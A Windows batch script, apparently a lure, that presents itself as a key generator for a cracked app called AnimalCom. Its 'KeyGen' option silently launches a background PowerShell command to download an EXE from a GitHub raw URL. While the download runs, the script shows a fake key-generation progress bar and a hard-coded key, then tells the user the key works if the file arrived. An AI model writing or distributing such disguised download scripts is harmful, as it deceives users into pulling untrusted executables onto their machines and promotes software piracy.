@echo off
cls
chcp 65001 >nul
title Cra  cked AnimalCom
color 3

:menu
echo ┏┓     ┓    ┓  ┓     ┏┓    ┓┓      ┓ 
echo ┃ ┏┓┏┓┏┃┏┏┓┏┫  ┣┓┓┏  ┃ ┏┓┏┓┃┣┓┏┓┏┳┓┣┓
echo ┗┛┛ ┗┻┗┛┗┗ ┗┻  ┗┛┗┫  ┗┛┗┛┗┛┗┗┛┗┛┛┗┗┗┛
echo                   ┛                  
echo.
echo ┌────────────────────────────┐
echo │ 1. KeyGen & Download       │
echo │                            │
echo │ 2. exit                    │
echo └────────────────────────────┘

set /p input= 

if /I "%input%"=="1" goto KeyGen
if /I "%input%"=="2" goto exit

pause

:exit
cls
echo Have a good day!
timeout /t 1 /nobreak >nul
exit

:KeyGen
cls
echo Herunterladen der EXE im Hintergrund...
set "url=https://raw.githubusercontent.com/CoolbombCracks/ACKeyGen/main/AC.exe"
set "target=AC.exe"

REM BackgroundDownload
start /b powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%cd%\%target%')"

REM Advanced
cls
echo Generating key... [▓▓▓▓▓▓▓▓▓▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [█▓▓▓▓▓▓▓▓▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [██▓▓▓▓▓▓▓▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [███▓▓▓▓▓▓▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [████▓▓▓▓▓▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [██████▓▓▓▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [███████▓▓▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [████████▓▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [█████████▓▓▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [███████████▓▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [████████████▓]
timeout /t 1 /nobreak >nul
cls
echo Generating key... [█████████████]
timeout /t 1 /nobreak >nul
cls
echo !Done generating the key!
echo WH24-LKGH-09HWJ

REM Download, Done
if exist "%target%" (
    echo The key should be working Fine now please get the apk now!
) else (
    echo the key isnt working properly please restart or try again later!
)

pause
goto menu
